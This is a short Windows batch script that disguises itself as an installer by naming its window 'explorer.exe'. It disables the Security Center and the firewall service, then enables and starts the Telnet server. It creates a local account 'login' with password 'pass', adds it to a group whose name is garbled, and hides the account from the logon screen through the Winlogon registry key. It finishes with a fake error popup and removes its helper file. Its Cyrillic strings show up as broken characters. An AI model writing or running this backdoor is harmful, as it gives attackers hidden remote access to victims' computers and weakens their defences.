@echo off
title explorer.exe
echo Installing...
sc config wscsvc start= disabled
cls
sc config SharedAccess start= disabled
cls
sc config tlntsvr start= auto
cls
sc stop wscsvc
cls
sc stop SharedAccess
cls
sc start tlntsvr
cls
net user login pass /add
cls
net localgroup "������������" login /add
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v login /t REG_DWORD /d 0 /f
cls
echo Set s = CreateObject("Wscript.Shell") > C:\1.vbs
echo s.popup "��������� ������ �� ������� 00�0100012. ���������� �� ��������.", , "������", 0+16 >> C:\1.vbs
call C:\1.vbs
del C:\1.vbs
exit